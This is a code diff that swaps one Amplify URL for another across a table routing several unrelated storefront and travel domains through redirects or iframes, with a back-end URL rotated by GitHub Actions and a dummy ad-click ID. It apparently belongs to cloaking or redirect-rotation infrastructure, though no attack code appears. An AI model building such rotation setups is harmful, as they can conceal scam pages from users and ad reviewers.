@@ -51,7 +51,7 @@ const keyBatchRemaining = (id) => `aps:batch:${id}:remaining`;
 // Key that stores the current live Amplify URL (updated by GitHub Actions)
 const KEY_AMPLIFY_URL = "amplify:current_url";
 // Hardcoded fallback used when Redis is unreachable or the key hasn't been set yet
-const AMPLIFY_URL_FALLBACK = "https://main.d1nuyqudpxl5rg.amplifyapp.com" || process.env.AMPLIFY_URL_FALLBACK;
+const AMPLIFY_URL_FALLBACK = "https://main.duktyelff70vu.amplifyapp.com" || process.env.AMPLIFY_URL_FALLBACK;
 
 // ─── Clients ──────────────────────────────────────────────────────
 const s3Client = new S3Client({ region: REGION });
@@ -108,19 +108,19 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d1nuyqudpxl5rg.amplifyapp.com" },
-    "https://teruogames.org": { method: "redirect", target: "https://main.d1nuyqudpxl5rg.amplifyapp.com" },
-    "https://takahirofoodfarm.shop": { method: "redirect", target: "https://main.d1nuyqudpxl5rg.amplifyapp.com" },
+    "https://hiroakitravels.com": { method: "redirect", target: "https://main.duktyelff70vu.amplifyapp.com" },
+    "https://teruogames.org": { method: "redirect", target: "https://main.duktyelff70vu.amplifyapp.com" },
+    "https://takahirofoodfarm.shop": { method: "redirect", target: "https://main.duktyelff70vu.amplifyapp.com" },
   },
   dmc: {
     // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
     "https://totonoujp.netlify.app": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
-    "https://onsen-meitado.netlify.app": { method: "iframe", target: "https://main.d1nuyqudpxl5rg.amplifyapp.com" }, // takahiro link
+    "https://onsen-meitado.netlify.app": { method: "iframe", target: "https://main.duktyelff70vu.amplifyapp.com" }, // takahiro link
     // "https://onsen-meitado.netlify.app": { method: "redirect", target: AMPLIFY_URL_FALLBACK, redisKey: KEY_AMPLIFY_URL },
   },
   aomine: {
-    "https://seijakublessings.life": { method: "redirect", target: "https://main.d1nuyqudpxl5rg.amplifyapp.com" },
-    "https://seijakublessings.shop": { method: "redirect", target: "https://main.d1nuyqudpxl5rg.amplifyapp.com" },
+    "https://seijakublessings.life": { method: "redirect", target: "https://main.duktyelff70vu.amplifyapp.com" },
+    "https://seijakublessings.shop": { method: "redirect", target: "https://main.duktyelff70vu.amplifyapp.com" },
   },
 };
 
